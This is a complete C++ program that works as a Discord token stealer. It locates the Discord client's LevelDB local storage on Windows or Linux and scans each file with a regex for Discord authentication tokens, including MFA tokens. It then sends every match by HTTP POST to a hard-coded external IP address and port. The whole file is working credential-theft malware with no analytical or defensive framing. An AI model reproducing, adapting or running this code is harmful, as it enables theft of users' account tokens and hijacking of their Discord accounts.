#include <cstdlib>
#include <string>
#include <filesystem>
#include <regex>
#include <iostream>
#include <optional>
#include <fstream>
#include <boost/beast.hpp>

std::optional<std::filesystem::path> getLevelDBPath() {
#if defined(WIN32) || defined(_WIN32) || defined(__WIN32__) || defined(__NT__)
	auto appDataPathCharPtr = std::getenv("APPDATA");
#elif __linux__
	auto appDataPathCharPtr = std::getenv("XDG_CONFIG_HOME");
#endif
	if (appDataPathCharPtr == NULL) {
		return std::nullopt;
	}
	std::string appDataPath(appDataPathCharPtr);
	std::string levelDBPath = "discord/Local Storage/leveldb";
	std::filesystem::path path(appDataPath);
	path.append(levelDBPath);
	return path;
}

std::optional<std::string> loadLevelDB(std::filesystem::path path) {
	std::ifstream ifs(path, std::ios::binary | std::ios::in);
	std::string ldb = std::string(std::istreambuf_iterator<char>(ifs), std::istreambuf_iterator<char>());

	if (!ldb.size()) {
		return std::nullopt;
	}

	return ldb;
}

int send(std::string token) {
	constexpr auto host = "185.117.118.21";
	constexpr auto port = "34716";
	constexpr auto path = "/";
	constexpr auto httpVersion = 11;

	boost::asio::io_context ctx;
	boost::asio::ip::tcp::resolver resolver(ctx);
	boost::beast::tcp_stream stream(ctx);

	auto const results = resolver.resolve(host, port);
	stream.connect(results);

	boost::beast::http::request<boost::beast::http::string_body> req{boost::beast::http::verb::post, path, httpVersion};
	req.set(boost::beast::http::field::host, host);
	req.set(boost::beast::http::field::user_agent, BOOST_BEAST_VERSION_STRING);
	req.set(boost::beast::http::field::content_type, "text/plain");
	req.body() = token;
	req.prepare_payload();

	boost::beast::http::write(stream, req);

	boost::beast::flat_buffer buf;
	boost::beast::http::response<boost::beast::http::dynamic_body> res;

	boost::beast::http::read(stream, buf, res);

	boost::beast::error_code ec;
	stream.socket().shutdown(boost::asio::ip::tcp::socket::shutdown_both, ec);

	if (ec && ec != boost::beast::errc::not_connected) {
		std::cerr << boost::beast::system_error(ec).what() << std::endl;
		return 1;
	}

	return 0;
}

int main() {
	auto pathOptional = getLevelDBPath();
	if (!pathOptional) {
		return 1;
	}

	auto path = pathOptional.value();

	for (const auto& entry : std::filesystem::directory_iterator(path)) {
		if (!entry.is_regular_file()) {
			continue;
		}

		auto ldbOptional = loadLevelDB(entry.path());
		if (!ldbOptional) {
			return 1;
		}

		auto ldb = ldbOptional.value();

		std::smatch m;
		std::regex regex("[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{38}|mfa\\.[\\w-]{84}");

		if (std::regex_search(ldb, m, regex)) {
			if (send(m.str())) {
				return 1;
			}
			continue;
		}
	}

	return 1;
}
